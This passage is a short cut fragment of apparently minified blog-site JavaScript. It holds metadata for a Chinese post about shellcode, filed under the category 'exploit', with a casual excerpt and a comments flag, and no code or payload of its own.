shellcode 管窥",excerpt:"随便写写",category:"exploit",tags:["shellcode"],disqus:!0}}}});